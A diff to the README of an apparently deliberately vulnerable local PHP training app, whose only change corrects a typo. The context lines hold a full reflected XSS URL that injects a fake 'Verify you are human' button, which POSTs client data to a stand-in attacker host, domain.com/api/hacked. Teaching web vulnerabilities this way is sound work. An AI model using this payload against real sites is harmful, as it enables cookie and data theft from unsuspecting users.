@@ -38,7 +38,7 @@ Run on a php server locally. This has been tested on PHP version 8.3.12. You can
         - OWASP 2021 A3
 - http://localhost:8888/hacks/echo/?name=John%3Cscript%3Edocument.addEventListener(%22DOMContentLoaded%22,()=%3E{const%20d=document.createElement(%22div%22);d.innerHTML=`%3Cbutton%20onclick=%22fetch(%27https://domain.com/api/hacked%27,{method:%27POST%27,body:JSON.stringify({name:%27${name}%27})});%22%3EVerify%20you%20are%20human%3C/button%3E`;document.body.prepend(d)});%3C/script%3E
     - Cross-site scripting (XSS)
-    - Here when URL is shared, injects a "Verify you're human" button, but it steals user data stored on the client (could be cookies) and sends it to another server at domain.com/api/hacked/, when the user clicks the button. Notice that is the hacker's server and that the hacker's server must have CORS enabled to accept paylods from other websites.
+    - Here when URL is shared, injects a "Verify you're human" button, but it steals user data stored on the client (could be cookies) and sends it to another server at domain.com/api/hacked/, when the user clicks the button. Notice that is the hacker's server and that the hacker's server must have CORS enabled to accept payloads from other websites.
     - The URL contains a minified code snippet of:
     ```
     document.addEventListener("DOMContentLoaded", () => {
